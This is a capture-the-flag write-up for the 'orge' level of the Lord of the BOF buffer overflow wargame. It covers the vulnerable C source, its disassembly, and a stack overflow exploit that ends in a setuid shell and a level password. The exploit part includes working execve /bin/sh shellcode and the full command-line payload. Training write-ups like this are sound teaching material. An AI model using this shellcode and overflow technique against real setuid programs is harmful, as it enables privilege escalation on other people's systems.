# Level 6, Darkelf -> Orge

### orge.c

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - orge
        - check argv[0]
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
        char buffer[40];
        int i;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        // here is changed!
        if(strlen(argv[0]) != 77){
                printf("argv[0] error\n");
                exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
                memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        // check the length of argument
        if(strlen(argv[1]) > 48){
                printf("argument is too long!\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);
}
```

### Analysis

#### Disassembling the "orge"

```
0x8048500 <main>:       push   %ebp
0x8048501 <main+1>:     mov    %ebp,%esp
0x8048503 <main+3>:     sub    %esp,44
0x8048506 <main+6>:     cmp    DWORD PTR [%ebp+8],1
0x804850a <main+10>:    jg     0x8048523 <main+35>
0x804850c <main+12>:    push   0x8048690
0x8048511 <main+17>:    call   0x8048410 <printf>
0x8048516 <main+22>:    add    %esp,4
0x8048519 <main+25>:    push   0
0x804851b <main+27>:    call   0x8048420 <exit>
0x8048520 <main+32>:    add    %esp,4
0x8048523 <main+35>:    mov    %eax,DWORD PTR [%ebp+12]
0x8048526 <main+38>:    mov    %edx,DWORD PTR [%eax]
0x8048528 <main+40>:    push   %edx
0x8048529 <main+41>:    call   0x80483f0 <strlen>
0x804852e <main+46>:    add    %esp,4
0x8048531 <main+49>:    mov    %eax,%eax
0x8048533 <main+51>:    cmp    %eax,77
0x8048536 <main+54>:    je     0x8048550 <main+80>
0x8048538 <main+56>:    push   0x804869c
0x804853d <main+61>:    call   0x8048410 <printf>
0x8048542 <main+66>:    add    %esp,4
0x8048545 <main+69>:    push   0
0x8048547 <main+71>:    call   0x8048420 <exit>
0x804854c <main+76>:    add    %esp,4
0x804854f <main+79>:    nop
0x8048550 <main+80>:    nop
0x8048551 <main+81>:    mov    DWORD PTR [%ebp-44],0x0
0x8048558 <main+88>:    mov    %eax,DWORD PTR [%ebp-44]
0x804855b <main+91>:    lea    %edx,[%eax*4]
0x8048562 <main+98>:    mov    %eax,%ds:0x80497d4
0x8048567 <main+103>:   cmp    DWORD PTR [%eax+%edx],0
0x804856b <main+107>:   jne    0x8048570 <main+112>
0x804856d <main+109>:   jmp    0x80485b0 <main+176>
0x804856f <main+111>:   nop
0x8048570 <main+112>:   mov    %eax,DWORD PTR [%ebp-44]
0x8048573 <main+115>:   lea    %edx,[%eax*4]
0x804857a <main+122>:   mov    %eax,%ds:0x80497d4
0x804857f <main+127>:   mov    %edx,DWORD PTR [%eax+%edx]
0x8048582 <main+130>:   push   %edx
0x8048583 <main+131>:   call   0x80483f0 <strlen>
0x8048588 <main+136>:   add    %esp,4
0x804858b <main+139>:   mov    %eax,%eax
0x804858d <main+141>:   push   %eax
0x804858e <main+142>:   push   0
0x8048590 <main+144>:   mov    %eax,DWORD PTR [%ebp-44]
0x8048593 <main+147>:   lea    %edx,[%eax*4]
0x804859a <main+154>:   mov    %eax,%ds:0x80497d4
0x804859f <main+159>:   mov    %edx,DWORD PTR [%eax+%edx]
0x80485a2 <main+162>:   push   %edx
0x80485a3 <main+163>:   call   0x8048430 <memset>
0x80485a8 <main+168>:   add    %esp,12
0x80485ab <main+171>:   inc    DWORD PTR [%ebp-44]
0x80485ae <main+174>:   jmp    0x8048558 <main+88>
0x80485b0 <main+176>:   mov    %eax,DWORD PTR [%ebp+12]
0x80485b3 <main+179>:   add    %eax,4
0x80485b6 <main+182>:   mov    %edx,DWORD PTR [%eax]
0x80485b8 <main+184>:   add    %edx,47
0x80485bb <main+187>:   cmp    BYTE PTR [%edx],0xbf
0x80485be <main+190>:   je     0x80485d7 <main+215>
0x80485c0 <main+192>:   push   0x80486ab
0x80485c5 <main+197>:   call   0x8048410 <printf>
0x80485ca <main+202>:   add    %esp,4
0x80485cd <main+205>:   push   0
0x80485cf <main+207>:   call   0x8048420 <exit>
0x80485d4 <main+212>:   add    %esp,4
0x80485d7 <main+215>:   mov    %eax,DWORD PTR [%ebp+12]
0x80485da <main+218>:   add    %eax,4
0x80485dd <main+221>:   mov    %edx,DWORD PTR [%eax]
0x80485df <main+223>:   push   %edx
0x80485e0 <main+224>:   call   0x80483f0 <strlen>
0x80485e5 <main+229>:   add    %esp,4
0x80485e8 <main+232>:   mov    %eax,%eax
0x80485ea <main+234>:   cmp    %eax,48
0x80485ed <main+237>:   jbe    0x8048606 <main+262>
0x80485ef <main+239>:   push   0x80486c8
0x80485f4 <main+244>:   call   0x8048410 <printf>
0x80485f9 <main+249>:   add    %esp,4
0x80485fc <main+252>:   push   0
0x80485fe <main+254>:   call   0x8048420 <exit>
0x8048603 <main+259>:   add    %esp,4
0x8048606 <main+262>:   mov    %eax,DWORD PTR [%ebp+12]
0x8048609 <main+265>:   add    %eax,4
0x804860c <main+268>:   mov    %edx,DWORD PTR [%eax]
0x804860e <main+270>:   push   %edx
0x804860f <main+271>:   lea    %eax,[%ebp-40]
0x8048612 <main+274>:   push   %eax
0x8048613 <main+275>:   call   0x8048440 <strcpy>
0x8048618 <main+280>:   add    %esp,8
0x804861b <main+283>:   lea    %eax,[%ebp-40]
0x804861e <main+286>:   push   %eax
0x804861f <main+287>:   push   0x80486df
0x8048624 <main+292>:   call   0x8048410 <printf>
0x8048629 <main+297>:   add    %esp,8
0x804862c <main+300>:   push   40
0x804862e <main+302>:   push   0
0x8048630 <main+304>:   lea    %eax,[%ebp-40]
0x8048633 <main+307>:   push   %eax
0x8048634 <main+308>:   call   0x8048430 <memset>
0x8048639 <main+313>:   add    %esp,12
0x804863c <main+316>:   leave
0x804863d <main+317>:   ret
```

#### Estimated Stack Structure

```
|  int i (4 bytes)            |         [%ebp-44]
|  BUFFER (40 bytes)          |         [%ebp-40]
|  SFP (4 bytes)              |         [%ebp]
|  RET (4 bytes)              |         [%ebp+4]
|  ARGC (4 bytes)             |         [%ebp+8]
|  ARGV[0] (?? bytes)         |         DWORD PTR [%ebp+12]
|  ARGV[1] (?? bytes)         |         DWORD PTR [%ebp+16]
```

#### Observed Stack Structure (bp at *main+283)

```
Can't debug with modified ARGV[0], will figure out
```

### Exploit

#### Payload Structure

```
ARGV[0]
'.'+'/'*72+'orge'      // Setting len(ARGV[0]) to 77

ARGV[1]
'A'*44
+
'\xac\xfb\xff\xbf'

ARGV[2]
'\x90'*200
+
'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'
```

#### Shellcode (24 bytes)

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```

#### Final Payload

```
`python -c "print '.'+'/'*72+'orge'"` `python -c "print 'A'*44+'\xac\xfb\xff\xbf'"` `python -c "print '\x90'*200+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`
```

### Result

```
[darkelf@localhost darkelf]$ `python -c "print '.'+'/'*72+'orge'"` `python -c "print 'A'*44+'\xac\xfb\xff\xbf'"` `python -c "print '\x90'*200+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒▒▒▒
bash$ id
uid=506(darkelf) gid=506(darkelf) euid=507(orge) egid=507(orge) groups=506(darkelf)
bash$ my-pass
euid = 507
timewalker
```